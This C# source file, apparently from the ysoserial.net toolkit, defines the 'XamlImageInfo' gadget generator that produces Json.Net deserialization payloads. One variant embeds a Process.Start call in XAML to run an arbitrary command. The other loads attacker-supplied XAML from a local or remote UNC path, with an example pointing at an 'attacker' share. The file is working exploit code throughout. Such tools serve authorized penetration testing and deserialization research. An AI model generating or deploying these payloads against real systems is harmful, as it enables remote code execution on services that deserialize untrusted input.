using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Data;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class XamlImageInfoGenerator : GenericGenerator
    {
        // XamlImageInfo
        // XamlImageInfo constructor leads to XamlReader.Load(Stream) call

        // We need to deserialize Stream to exploit this. There are currently 2 variants implemented
        // 1 - (GAC) LazyFileStream for stream delivery. Can be remote XAML file (like \\192.168.1.100\poc\poc.xaml) or local file
        // 2 - (non-GAC) ReadOnlyStreamFromStrings - allows to directly deliver XAML gadget 

        private int variant_number = 1; // Default

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Json.Net" }; // MessagePack may work too, but it may have issues with the XamlImageInfo constructor (to be verified)
        }

        public override string Name()
        {
            return "XamlImageInfo";
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Variant number. Variant defines a different Stream delivery class. Choices: \r\n1 (default and GAC) - LazyFileStream for Stream delivery, file path has to be provided for -c argument (UNC or local) " +
                "\r\n2 (non-GAC, requires Microsoft.Web.Deployment.dll) - ReadOnlyStreamFromStrings for Stream delivery, command to execute can be provided for -c argument", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override string AdditionalInfo()
        {
            return "Gadget leads to XAML deserialization. Variant 1 (GAC) reads XAML from file (local path or UNC path can be given). Variant 2 (non-GAC) delivers XAML directly, but requires Microsoft.Web.Deployment.dll";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeButDervied, "Variant 1 in GAC, Variant 2 not in GAC" };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {

            String payload;

            if (formatter.ToLowerInvariant().Equals("json.net"))
            {

                if (variant_number == 2)
                {
                    ProcessStartInfo psi = new ProcessStartInfo();

                    psi.FileName = inputArgs.CmdFileName;
                    if (inputArgs.HasArguments)
                    {
                        psi.Arguments = inputArgs.CmdArguments;
                    }

                    StringDictionary dict = new StringDictionary();
                    psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                    Process p = new Process();
                    p.StartInfo = psi;
                    ObjectDataProvider odp = new ObjectDataProvider();
                    odp.MethodName = "Start";
                    odp.IsInitialLoadEnabled = false;
                    odp.ObjectInstance = p;

                    String xamlPayload = SerializersHelper.Xaml_serialize(odp).Replace("utf-16","utf-8");

                    String streamPayload = @"{
    '$type':'Microsoft.Web.Deployment.ReadOnlyStreamFromStrings, Microsoft.Web.Deployment, Version=9.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'enumerator':{
        '$type':'Microsoft.Web.Deployment.GroupedIEnumerable`1+GroupEnumerator[[System.String, mscorlib]], Microsoft.Web.Deployment, Version=9.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
        'enumerables':
        [
            {
                '$type':'System.Collections.Generic.List`1[[System.String, mscorlib]], mscorlib',
                '$values':['']
            }
        ]
    },
    'stringSuffix':'" + xamlPayload + @"'
    }";

                    payload = @"{
    '$type':'System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'stream':" + streamPayload + @"
}";
                }
                else
                {                    
                    if (inputArgs.Test)
                    {
                        Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your XAML file. UNC path can be used for the remote file loading\r\nExample: ysoserial.exe -g XamlImageInfo -f Json.Net -c '\\\\attacker\\poc\\your.xaml'");
                    }

                    inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
                    inputArgs.IsRawCmd = true;
                    
                    payload = @"{
    '$type':'System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'stream':{
        '$type':'Microsoft.Build.Tasks.Windows.ResourcesGenerator+LazyFileStream, PresentationBuildTasks, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','path':'" + inputArgs.CmdFullString + @"'
    }
}";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
